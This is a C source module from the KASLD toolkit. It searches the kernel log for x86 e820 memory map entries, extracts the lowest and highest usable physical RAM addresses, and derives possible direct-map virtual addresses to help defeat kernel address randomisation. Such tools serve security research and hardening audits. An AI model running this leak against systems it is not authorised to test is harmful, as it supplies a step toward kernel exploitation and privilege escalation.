// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search kernel log for e820 memory map physical addresses.
//
// On x86 systems, the BIOS/firmware provides the physical memory map via the
// e820 interface. The kernel prints these entries to dmesg during early boot.
//
// Two message formats may appear:
//
// pr_info (always printed):
//   BIOS-e820: [mem 0x0000000000000000-0x000000000009ffff] usable
//
// KERN_DEBUG (printed when reserving RAM alignment buffers):
//   e820: reserve RAM buffer [mem 0x0009fc00-0x0009ffff]
//
// Both formats leak physical memory addresses from the firmware memory map.
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://elixir.bootlin.com/linux/v6.1.1/source/arch/x86/kernel/e820.c#L203
// https://elixir.bootlin.com/linux/v6.1.1/source/arch/x86/kernel/e820.c#L1240
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/dmesg.h"
#include "include/kasld.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#if !defined(__i386__) && !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported"
#endif

struct e820_ctx {
  unsigned long lo; /* lowest start address of usable RAM */
  unsigned long hi; /* highest end address of usable RAM */
};

static int on_match(const char *line, void *ctx) {
  struct e820_ctx *e = ctx;

  /*
   * Two formats:
   *   BIOS-e820: [mem 0x...-0x...] usable     (pr_info, type-tagged)
   *   e820: reserve RAM buffer [mem 0x...-0x...] (KERN_DEBUG, always RAM)
   *
   * For BIOS-e820 lines, only "usable" entries are actual DRAM.
   * The "reserve RAM buffer" lines are derived from RAM entries in the kernel
   * (e820.c only processes E820_TYPE_RAM), so they are always DRAM-relevant.
   */
  int is_bios_line = strstr(line, "BIOS-e820:") != NULL ||
                     strstr(line, "modified:") != NULL ||
                     strstr(line, "user:") != NULL;
  if (is_bios_line && !strstr(line, "usable"))
    return 1;

  const char *p = strstr(line, "[mem ");
  if (!p)
    return 1;

  char *endptr;
  unsigned long start = strtoul(p + 5, &endptr, 16);

  /* Parse end address after the '-' separator */
  unsigned long end = 0;
  if (*endptr == '-')
    end = strtoul(endptr + 1, &endptr, 16);

  if (start && (!e->lo || start < e->lo))
    e->lo = start;
  if (end > e->hi)
    e->hi = end;

  return 1; /* continue scanning all entries */
}

int main(void) {
  struct e820_ctx e = {0, 0};

  printf("[.] searching dmesg for e820 physical memory map ...\n");
  dmesg_search("e820", on_match, &e);

  if (!e.lo && !e.hi)
    return 1;

  if (e.lo) {
    printf("leaked e820 DRAM low:  0x%016lx\n", e.lo);
    kasld_result(KASLD_ADDR_PHYS, KASLD_SECTION_DRAM, e.lo,
                 "dmesg_e820_memory_map:lo");
  }

  if (e.hi) {
    printf("leaked e820 DRAM high: 0x%016lx\n", e.hi);
    kasld_result(KASLD_ADDR_PHYS, KASLD_SECTION_DRAM, e.hi,
                 "dmesg_e820_memory_map:hi");
  }

#if !PHYS_VIRT_DECOUPLED
  if (e.lo) {
    unsigned long virt = phys_to_virt(e.lo);
    printf("possible direct-map virtual address (low):  0x%016lx\n", virt);
    kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DIRECTMAP, virt,
                 "dmesg_e820_memory_map:lo");
  }
  if (e.hi) {
    unsigned long virt = phys_to_virt(e.hi);
    printf("possible direct-map virtual address (high): 0x%016lx\n", virt);
    kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DIRECTMAP, virt,
                 "dmesg_e820_memory_map:hi");
  }
#else
  printf("note: phys and virt KASLR are decoupled on this arch; "
         "cannot derive kernel text virtual address from physical leak\n");
#endif

  return 0;
}
